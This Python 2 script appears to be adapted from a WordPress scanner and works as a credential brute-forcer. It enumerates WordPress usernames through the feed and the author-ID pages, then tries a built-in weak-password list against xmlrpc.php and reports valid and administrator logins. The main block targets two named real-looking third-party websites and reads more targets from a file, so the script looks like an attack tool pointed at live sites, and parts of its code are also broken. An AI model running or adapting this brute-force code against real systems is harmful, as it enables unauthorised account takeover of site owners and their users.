import smtplib, base64, os, sys, getopt, urllib2, urllib, re, socket, time, httplib, tarfile
import sys
import requests
from  report import Report

version=0.6
agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
verbose = False
CMSmapUpdate = False
BruteForcingAttack = False
CrackingPasswords = False
FullScan = False
NoExploitdb = False
dataPath = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'data')
threads = 5
wordlist = 'wordlist/rockyou.txt'

class MyResponse(httplib.HTTPResponse):
    def read(self, amt=None):
        self.length = None
        
        return httplib.HTTPResponse.read(self, amt)

class MyHandler(urllib2.HTTPHandler):
    def do_open(self, http_class, req):
        h = httplib.HTTPConnection
        h.response_class = MyResponse
        
        return urllib2.HTTPHandler.do_open(self, h, req)

class WPBrute: 
    # Scan WordPress site
    def __init__(self,url,threads):
        self.headers={'User-Agent':agent,}
        self.url = url
        self.currentVer = None
        self.latestVer = None
        self.queue_num = 5
        self.thread_num = threads
        self.pluginPath = "/wp-content/plugins/"
        self.themePath = "/wp-content/themes/"
        self.feed = "/?feed=rss2"
        self.author = "/?author="
        self.forgottenPsw = "/wp-login.php?action=lostpassword"
        self.weakpsw = ['000000', '12345', '123456', '1234567', '123456a', 'P@ssw0rd', 'Password', 'a123456', 'abc123', 'admin', 'fuckme', 'fuckyou', 'password', 'qq123456', 'qwe123', 'qwerty', 'woaini1314']
        self.usernames = []
        self.pluginsFound = []
        self.themesFound = []
        self.timthumbsFound = []
        self.notValidLen = []
        self.theme = None
        self.notExistingCode = 404
        self.confFiles=['','.php~','.php.txt','.php.old','.php_old','.php-old','.php.save','.php.swp','.php.swo','.php_bak','.php-bak','.php.original','.php.old','.php.orig','.php.bak','.save','.old','.bak','.orig','.original','.txt']
        """
        self.genChecker = GenericChecks(url)
        self.genChecker.NotExisitingLength()
        self.plugins_small = [line.strip() for line in open(os.path.join(dataPath, 'wp_plugins_small.txt'))]
        self.plugins = [line.strip() for line in open(os.path.join(dataPath, 'wp_plugins.txt'))]
        self.versions = [line.strip() for line in open(os.path.join(dataPath, 'wp_versions.txt'))]
        self.themes = [line.strip() for line in open(os.path.join(dataPath, 'wp_themes.txt'))]
        self.themes_small = [line.strip() for line in open(os.path.join(dataPath, 'wp_themes_small.txt'))]
        self.timthumbs = [line.strip() for line in open(os.path.join(dataPath, 'wp_timthumbs.txt'))]
        searcher.cmstype = "Wordpress"
        """
            
    def WPrun(self):
        #msg = "CMS Detection: Wordpress"; report.info(msg)
        #self.WPNotExisitingCode()
        #self.WPVersion()
        #self.WPCurrentTheme()
        self.FindCMSType()
        #self.WPConfigFiles()
        #self.WPHello()
        self.WPFeed()
        self.WPAuthor()
        self.usrlist = self.usernames 
        self.pswlist = self.weakpsw
        self.WPXMLRPC_brute()
        """
        self.WPForgottenPassword()
        self.WPXMLRPC_pingback()
        self.WPXMLRPC_BF()
        self.genChecker.AutocompleteOff('/wp-login.php')
        self.WPDefaultFiles()
        if FullScan : self.genChecker.CommonFiles()
        self.WPpluginsIndex()
        self.WPplugins()
        searcher.query = self.pluginsFound; searcher.Plugins()
        if FullScan : self.WPThemes(); searcher.query = self.themesFound; searcher.Themes()
        self.WPTimThumbs()
        self.WPDirsListing()
        """

    def FindCMSType(self):
        try:
            req=requests.get(self.url+"/wp-config.php",headers=self.headers,timeout=10)
            print req.text
            if req.status_code in [200,403]:
                msg = "CMS Detection: Wordpress"; report.info(msg)
            else:
                sys.exit(0)
        except:
            sys.exit(0)
              
    def WPVersion(self):
        try:
            req = urllib2.Request(self.url+'/readme.html',None,self.headers)
            htmltext = urllib2.urlopen(req).read()         
            regex = '.*wordpress-logo.png" /></a>\n.*<br />.* (\d+\.\d+[\.\d+]*)\n</h1>'
            pattern =  re.compile(regex)
            version = re.findall(pattern,htmltext)    
            if version:
                msg = "Wordpress Version: "+version[0]; report.info(msg)                     
        except urllib2.HTTPError, e:
            try:
                req = urllib2.Request(self.url,None,self.headers)
                htmltext = urllib2.urlopen(req).read()
                version = re.findall('<meta name="generator" content="WordPress (\d+\.\d+[\.\d+]*)"', htmltext)
                if version:
                    msg = "Wordpress Version: "+version[0]; report.info(msg)
            except urllib2.HTTPError, e:
                pass
        if version: 
           if version[0] in self.versions :
                for ver in self.versions:
                    searcher.query = ver; searcher.Core()
                    if ver == version[0]:
                        break  
            

    def WPConfigFiles(self):
        for file in self.confFiles:
            req = urllib2.Request(self.url+"/wp-config"+file,None,self.headers)
            try:
                htmltext = urllib2.urlopen(req).read()
                if len(htmltext) not in self.notValidLen:
                    msg = "Configuration File Found: " +self.url+"/wp-config"+file; report.high(msg)
            except urllib2.HTTPError, e:
                pass

            
    def WPFeed(self):
        msg = "Enumerating Wordpress Usernames via \"Feed\" ..."; report.verbose(msg)
        try:
            req = urllib2.Request(self.url+self.feed,None,self.headers)
            htmltext = urllib2.urlopen(req).read()
            wpUsers = re.findall("<dc:creator><!\[CDATA\[(.+?)\]\]></dc:creator>", htmltext,re.IGNORECASE)
            wpUsers2 = re.findall("<dc:creator>(.+?)</dc:creator>", htmltext,re.IGNORECASE)
            if wpUsers :
                self.usernames = wpUsers + self.usernames
                self.usernames = sorted(set(self.usernames))
            #for user in self.usernames:
                #msg = user; report.medium(msg)
        except urllib2.HTTPError, e:
            #print e.code
            pass
        
    def WPAuthor(self):
        msg = "Enumerating Wordpress Usernames "; report.message(msg)
        for user in range(1,20):
            try:
                req = urllib2.Request(self.url+self.author+str(user),None,self.headers)
                htmltext = urllib2.urlopen(req).read()
                wpUser = re.findall("author author-(.+?) ", htmltext,re.IGNORECASE)
                if wpUser : self.usernames = wpUser + self.usernames
                wpUser = re.findall("/author/(.+?)/feed/", htmltext,re.IGNORECASE)
                if wpUser : self.usernames = wpUser + self.usernames                 
            except urllib2.HTTPError, e:
                #print e.code
                pass
        self.usernames = sorted(set(self.usernames))
        for user in self.usernames:
            msg = user; report.medium(msg)
        

    def WPHello(self):
        try:
            req = urllib2.Request(self.url+"/wp-content/plugins/hello.php",None,self.headers)
            htmltext = urllib2.urlopen(req).read()
            fullPath = re.findall(re.compile('Fatal error.*>/(.+?/)hello.php'),htmltext)
            if fullPath :
                msg = "Wordpress Hello Plugin Full Path Disclosure: "+"/"+fullPath[0]+"hello.php"; report.low(msg)
        except urllib2.HTTPError, e:
            #print e.code
            pass

    def WPXMLRPC_brute(self):
        msg = "Starting XML-RPC Brute Forcing"; report.message(msg)
        for user in self.usrlist:
            for pwd in self.pswlist:
                self.headers['Content-Type'] ='text/xml'
                self.postdata = ('<methodCall><methodName>wp.getUsersBlogs</methodName><params>'
                                 '<param><value><string>'+user+'</string></value></param>'
                                 '<param><value><string>'+pwd+'</string></value></param></params></methodCall>')
                msg = "Trying Credentials: "+user+" "+pwd; report.verbose(msg)
                try:
                    req = urllib2.Request(self.url+'/xmlrpc.php',self.postdata,self.headers)
                    opener = urllib2.build_opener(MyHandler())
                    htmltext = opener.open(req).read()
                    if re.search('<name>isAdmin</name><value><boolean>0</boolean>',htmltext):
                        msg = "Valid Credentials: "+user+" "+pwd; report.high(msg)
                        self.WPValidCredentials.append([user,pwd])
                    elif re.search('<name>isAdmin</name><value><boolean>1</boolean>',htmltext):
                        msg = "Valid ADMIN Credentials: "+user+" "+pwd; report.high(msg)
                        self.WPValidCredentials.append([user,pwd])
                except urllib2.HTTPError, e:
                    #print e.code
                    pass


if __name__ == "__main__":
    report=Report()

    lists1=[line.strip() for line in open('m.txt','r')]
    #print lists1
    lists=['http://www.lombardometal.com:80', 'http://www.flatroofs.ca:80']
    for url in lists: 
        print url          
        wpbrute=WPBrute(url,5)
        wpbrute.WPrun()


